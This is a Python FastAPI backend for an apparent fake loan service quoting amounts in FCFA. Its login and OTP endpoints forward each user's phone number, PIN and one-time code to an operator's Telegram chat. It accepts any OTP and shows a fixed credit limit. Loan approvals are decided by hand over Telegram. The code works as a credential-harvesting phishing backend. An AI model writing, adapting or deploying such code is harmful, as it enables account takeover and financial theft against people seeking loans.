import os
import uuid
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request, Header
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
import httpx

# Load environment variables
load_dotenv()

app = FastAPI()

# --- CORS CONFIGURATION ---
# We read the allowed origins from an environment variable, defaulting to localhost.
# When deploying to Render, set ALLOWED_ORIGINS to your Netlify URL.
allowed_origins_str = os.getenv("ALLOWED_ORIGINS", "http://localhost:5173,http://localhost:3000")
allowed_origins = [origin.strip() for origin in allowed_origins_str.split(",")]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Optional: Add a secret token for your webhook for security
TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET", "my_super_secret_string")

# In-memory database to store loan statuses
# Format: {"loan_id_123": "pending" | "approved" | "denied"}
LOAN_REQUESTS = {}

# --- HELPER FUNCTIONS ---
async def send_telegram_message(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json=payload)
        except Exception as e:
            print(f"Failed to send message: {e}")

# --- DATA MODELS ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp_code: str

class LoanRequest(BaseModel):
    phone_number: str
    amount: float
    months: int

# --- ENDPOINTS ---

@app.post("/api/login")
async def login(data: LoginRequest):
    await send_telegram_message(
        f"🔐 <b>New Login Attempt</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔑 PIN: {data.pin}"
    )
    if len(data.pin) != 5:
        raise HTTPException(status_code=400, detail="PIN must be 5 digits")
    return {"status": "success", "message": "OTP sent"}

@app.post("/api/verify-otp")
async def verify_otp(data: OTPRequest):
    await send_telegram_message(
        f"✅ <b>OTP Verified</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔢 Code: {data.otp_code}"
    )
    return {"status": "success", "credit_limit": 780000}

@app.post("/api/apply-loan")
async def apply_loan(data: LoanRequest):
    loan_id = str(uuid.uuid4())
    LOAN_REQUESTS[loan_id] = "pending"

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": (
                f"💰 <b>New Loan Application</b>\n"
                f"📱 Phone: {data.phone_number}\n"
                f"💵 Amount: {data.amount:,.0f} FCFA\n"
                f"📅 Months: {data.months}\n\n"
                f"<i>Please Approve or Deny this request:</i>"
            ),
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [
                    [
                        {"text": "✅ Approve", "callback_data": f"approve_{loan_id}"},
                        {"text": "❌ Deny", "callback_data": f"deny_{loan_id}"}
                    ]
                ]
            }
        }
        async with httpx.AsyncClient() as client:
            await client.post(url, json=payload)

    return {"status": "pending", "loan_id": loan_id}

# --- TELEGRAM WEBHOOK ENDPOINT ---
@app.post("/api/telegram-webhook")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: str = Header(None)):
    # Security Check: Ensure the request actually comes from Telegram
    if x_telegram_bot_api_secret_token != TELEGRAM_WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid secret token")

    try:
        data = await request.json()

        if "callback_query" in data:
            callback = data["callback_query"]
            callback_id = callback["id"]
            chat_id = callback["message"]["chat"]["id"]
            message_id = callback["message"]["message_id"]
            original_text = callback["message"]["text"]
            
            action_data = callback["data"]
            action, loan_id = action_data.split("_", 1)

            if loan_id in LOAN_REQUESTS:
                if action == "approve":
                    LOAN_REQUESTS[loan_id] = "approved"
                    reply_text = "✅ Loan Approved by Admin."
                else:
                    LOAN_REQUESTS[loan_id] = "denied"
                    reply_text = "❌ Loan Denied by Admin."

                async with httpx.AsyncClient() as client:
                    # 1. Answer the callback (stops the loading spinner on Telegram)
                    await client.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                        json={"callback_query_id": callback_id, "text": reply_text}
                    )
                    
                    # 2. Edit the original message to remove the buttons
                    try:
                        await client.post(
                            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
                            json={
                                "chat_id": chat_id,
                                "message_id": message_id,
                                "text": f"{original_text}\n\n<b>Result: {reply_text}</b>",
                                "parse_mode": "HTML"
                            }
                        )
                    except Exception as e:
                        print(f"Could not edit message (it may have already been edited): {e}")
                        
    except Exception as e:
        print(f"Webhook error: {e}")
        
    return {"status": "ok"}

@app.get("/api/loan-status/{loan_id}")
async def get_loan_status(loan_id: str):
    if loan_id not in LOAN_REQUESTS:
        raise HTTPException(status_code=404, detail="Loan not found")
    return {"status": LOAN_REQUESTS[loan_id]}